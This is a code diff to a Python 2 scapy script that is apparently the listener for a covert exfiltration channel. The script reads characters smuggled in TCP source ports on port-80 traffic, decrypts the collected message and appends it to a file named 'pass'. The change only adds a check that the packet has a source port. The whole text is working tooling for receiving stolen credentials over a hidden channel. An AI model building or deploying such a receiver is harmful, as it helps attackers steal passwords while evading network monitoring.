@@ -22,17 +22,19 @@ def main(argv):
 	msg = []
 	while 1:
 		recieved = sniff(filter="tcp and port 80", count=1)
-		if recieved[0].sport == 30000:
-			clear = decrypt(key, str(msg))
-			print 'Recieved: '+ clear
-			f = open('pass', 'a')
-			f.write(clear)
-			f.close()
-			msg = []
-		else:
-			try:
-				msg.append(chr(recieved[0].sport - 10000))
-			except ValueError:
-				print 'Strange sport detected: '+ recieved[0].sport
+		if hasattr(recieved[0], 'sport'):
+			if recieved[0].sport == 30000:
+				clear = decrypt(key, str(msg))
+				print 'Recieved: '+ clear
+				f = open('pass', 'a')
+				f.write(clear)
+				f.close()
+				msg = []
+			else:
+				try:
+					msg.append(chr(recieved[0].sport - 10000))
+				except ValueError:
+					print 'Strange sport detected: '+ recieved[0].sport
+
 if __name__ == '__main__':
 	main(sys.argv)
